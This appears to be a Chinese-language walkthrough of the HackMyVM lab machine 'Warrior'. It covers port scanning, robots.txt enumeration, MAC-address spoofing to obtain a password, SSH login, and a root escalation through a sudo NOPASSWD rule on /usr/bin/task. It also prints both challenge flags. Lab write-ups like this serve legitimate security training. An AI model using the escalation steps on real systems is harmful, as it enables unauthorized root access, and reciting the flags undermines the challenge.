# Warrior

2025.01.02 https://hackmyvm.eu/machines/machine.php?vm=Warrior

## Ip

192.168.5.21

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先访问 80 web 服务，http://192.168.5.21/robots.txt 发现几个文件：

```
Disallow:/admin
Disallow:/secret.txt
Disallow:/uploads/id_rsa
Disallow:/internal.php
Disallow:/internal
Disallow:/cms
Disallow:/user.txt
```

访问 http://192.168.5.21/internal.php 出现提示： Hey bro, you need to have an internal MAC as 00:00:00:00:00:a? to read your pass..

发现一个用户名 bro 并且提示要把 MAC 地址改成　 00:00:00:00:00:a?　格式，尝试修改 kali 的 mac 地址没最终发现 00:00:00:00:00:af 可以进行访问，得到了一个字符串 Zurviv0r1

尝试用户凭据 bro:Zurviv0r1 登陆 ssh，登陆成功，先得到了 user flag：

```
bro@warrior:~$ cat user.txt
LcHHbXGHMVhCpQHvqDen
```

经过枚举，发现 /usr/sbin/sudo -l ：

```
(root) NOPASSWD: /usr/bin/task
```

直接提权：

```
/usr/sbin/sudo task execute /bin/bash

root@warrior:~# cat root.txt
HPiGHMVcDNLlXbHLydMv
```
